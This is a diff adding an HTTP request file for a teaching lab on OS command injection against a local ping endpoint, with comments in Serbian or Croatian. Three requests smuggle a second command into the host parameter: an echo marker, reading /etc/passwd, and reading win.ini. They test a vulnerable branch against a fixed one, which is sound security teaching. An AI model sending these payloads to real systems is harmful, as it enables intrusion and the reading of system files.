@@ -1,0 +1,18 @@
+### Lab09 – OS command injection
+@host = http://localhost:8000
+
+### 1. Legitimni ping
+GET {{host}}/api/lab09/ping?host=127.0.0.1
+
+### 2. EKSPLOATACIJA: nadovezivanje naredbe (& radi u cmd i sh)
+# host = 127.0.0.1 & echo PWNED_LAB09  (URL-enkodirano)
+# Ranjivo (main): u izlazu se vidi PWNED_LAB09. Popravljeno: 400.
+GET {{host}}/api/lab09/ping?host=127.0.0.1%20%26%20echo%20PWNED_LAB09
+
+### 3. EKSPLOATACIJA (Linux/macOS): ; cat /etc/passwd
+# host = 127.0.0.1; cat /etc/passwd
+GET {{host}}/api/lab09/ping?host=127.0.0.1%3B%20cat%20%2Fetc%2Fpasswd
+
+### 4. EKSPLOATACIJA (Windows): & type C:\Windows\win.ini
+# host = 127.0.0.1 & type C:\Windows\win.ini
+GET {{host}}/api/lab09/ping?host=127.0.0.1%20%26%20type%20C%3A%5CWindows%5Cwin.ini
